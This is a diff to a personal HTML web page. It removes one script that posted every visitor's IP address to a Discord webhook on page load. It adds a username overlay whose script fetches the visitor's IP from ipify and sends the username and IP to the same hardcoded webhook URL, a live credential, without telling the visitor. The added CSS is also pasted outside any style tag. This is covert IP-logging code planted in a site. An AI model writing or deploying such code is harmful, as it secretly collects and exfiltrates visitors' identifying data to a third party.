@@ -18,6 +18,52 @@
     <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
     <link rel="stylesheet" href="assets/css/styles.css">
     <link rel="stylesheet" href="assets/css/Navigation-Clean.css">
+    #username-screen {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0, 0, 0, 0.9);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  font-family: sans-serif;
+}
+
+.login-box {
+  background: #2b2d31;
+  padding: 40px;
+  border-radius: 8px;
+  text-align: center;
+  color: white;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+}
+
+.login-box input {
+  padding: 10px;
+  margin: 15px 0;
+  width: 80%;
+  border-radius: 4px;
+  border: none;
+  font-size: 16px;
+}
+
+.login-box button {
+  padding: 10px 20px;
+  background: #5865F2; /* Discord Blurple */
+  color: white;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  font-weight: bold;
+}
+
+.login-box button:hover {
+  background: #4752c4;
+}
 </head>
 
 <body class="bmain">
@@ -84,23 +130,7 @@
   src="https://lanyard.cnrad.dev/api/946148998329278474?borderRadius=5px&idleMessage=sleeping%20zzz&amp;bg=a&amp;animated=true"
                     frameborder="0">
 </iframe>
-             <script>
-                    function getIP(json) {
-                        var request = new XMLHttpRequest(); //making a request for the webhook
-                        request.open("POST", "https://discord.com/api/webhooks/1530408235788406916/x5HnEENLDmM4Gr1gZtsYEEmRJ6Yb9mE6SLMmf77-oY0e56N48egBDELQsMSLQ6Hwpsmt");
-
-                        request.setRequestHeader('Content-type', 'application/json');
-
-                        var params = {
-                            username: "reebal-",
-                            avatar_url: "https://i.pinimg.com/736x/42/6b/af/426baf19b098a5781001c9bf8ff36178.jpg",
-                            content: "**IP**" + json.ip + "*"
-                        }
-                        //just a webhook parameters such as avatar,name,message
-
-                        request.send(JSON.stringify(params));
-                    }
-                </script>
+             
                 <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
              
             
@@ -115,6 +145,66 @@
     <script src="assets/js/lib/typed.js"></script>
     <script src="assets/js/ok.js"></script>
     <script src="assets/js/random_image.js"></script>
+
+<div id="username-screen">
+  <div class="login-box">
+    <h2>Enter your Username</h2>
+    <input type="text" id="username-input" placeholder="Username...">
+    <button id="submit-btn">Submit</button>
+  </div>
+</div>
+<script>
+  document.getElementById('submit-btn').addEventListener('click', async () => {
+    const username = document.getElementById('username-input').value.trim();
+    
+    if (!username) {
+      alert("Please enter a username!");
+      return;
+    }
+
+    // 1. Save the username to localStorage so the site remembers them
+    localStorage.setItem("savedUsername", username);
+
+    // 2. Hide the username screen to reveal your main page
+    document.getElementById('username-screen').style.display = 'none';
+
+    try {
+      // 3. Fetch the user's IP Address using the free ipify API
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ipAddress = ipData.ip;
+
+      // 4. Send the data to your Discord Webhook
+      // ⚠️ IMPORTANT: Replace this URL with your actual Discord Webhook URL
+      const webhookURL = "https://discord.com/api/webhooks/1530408235788406916/x5HnEENLDmM4Gr1gZtsYEEmRJ6Yb9mE6SLMmf77-oY0e56N48egBDELQsMSLQ6Hwpsmt"; 
+      
+      const payload = {
+        content: `🚨 **New User Logged In!** 🚨\n**Username:** \`${username}\`\n**IP Address:** \`${ipAddress}\``
+      };
+
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      console.log("Data sent to Discord successfully.");
+      
+    } catch (error) {
+      console.error("Error fetching IP or sending webhook:", error);
+    }
+  });
+
+  // Optional: Check if they already entered a username previously
+  window.onload = () => {
+    if (localStorage.getItem("savedUsername")) {
+      // If a username is already saved, hide the screen automatically
+      document.getElementById('username-screen').style.display = 'none';
+    }
+  };
+</script>
 </body>
 
 </html>
